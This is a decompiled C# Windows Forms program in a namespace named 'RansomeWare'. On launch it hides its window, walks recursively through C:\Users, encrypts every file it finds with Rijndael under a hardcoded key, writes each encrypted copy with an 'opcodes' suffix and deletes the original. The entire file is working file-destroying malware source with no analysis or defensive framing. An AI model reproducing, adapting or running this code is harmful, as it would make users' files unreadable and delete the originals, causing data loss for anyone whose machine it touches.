using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace RansomeWare;

public class Form1 : Form
{
	private IContainer components;

	private Label label1;

	public Form1()
	{
		InitializeComponent();
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		DirectoryInfo di = new DirectoryInfo("C:\\Users");
		teach(di);
		((Control)this).Show();
	}

	public static byte[] dword_ptr(byte[] Data, string Key, string Vector)
	{
		byte[] array = new byte[32];
		Array.Copy(Encoding.UTF8.GetBytes(Key.PadRight(array.Length)), array, array.Length);
		byte[] array2 = new byte[16];
		Array.Copy(Encoding.UTF8.GetBytes(Vector.PadRight(array2.Length)), array2, array2.Length);
		byte[] array3 = null;
		Rijndael rijndael = Rijndael.Create();
		try
		{
			using MemoryStream memoryStream = new MemoryStream();
			using CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateEncryptor(array, array2), CryptoStreamMode.Write);
			cryptoStream.Write(Data, 0, Data.Length);
			cryptoStream.FlushFinalBlock();
			return memoryStream.ToArray();
		}
		catch
		{
			return null;
		}
	}

	public void teach(DirectoryInfo di)
	{
		FileInfo[] files = di.GetFiles();
		foreach (FileInfo fileInfo in files)
		{
			try
			{
				FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.Open, FileAccess.Read);
				byte[] array = new byte[fileStream.Length];
				fileStream.Read(array, 0, (int)fileStream.Length);
				byte[] array2 = dword_ptr(array, "---000-", "---000-");
				FileStream fileStream2 = new FileStream(fileInfo.FullName + "opcodes", FileMode.Create, FileAccess.Write);
				fileStream2.Write(array2, 0, array2.Length);
				fileStream2.Flush();
				fileStream2.Close();
				fileStream.Close();
				File.Delete(fileInfo.FullName);
			}
			catch (Exception)
			{
			}
		}
		DirectoryInfo[] directories = di.GetDirectories();
		foreach (DirectoryInfo directoryInfo in directories)
		{
			try
			{
				if (directoryInfo.Name[0] != 'Z' && directoryInfo.Name[0] != '3' && directoryInfo.Name[0] != '!' && directoryInfo.Name[0] != '@' && directoryInfo.Name[0] != '#' && directoryInfo.Name[0] != '$' && directoryInfo.Name[0] != '%' && directoryInfo.Name[0] != '^' && directoryInfo.Name[0] != '&' && directoryInfo.Name[0] != '*')
				{
					teach(directoryInfo);
				}
			}
			catch (Exception)
			{
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_0121: Expected O, but got Unknown
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("微软雅黑", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)134));
		((Control)label1).set_Location(new Point(43, 6));
		((Control)label1).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(77, 31));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("teach\r\n");
		((Control)label1).add_Click((EventHandler)label1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(286, 70));
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(2, 2, 2, 2));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("teach");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
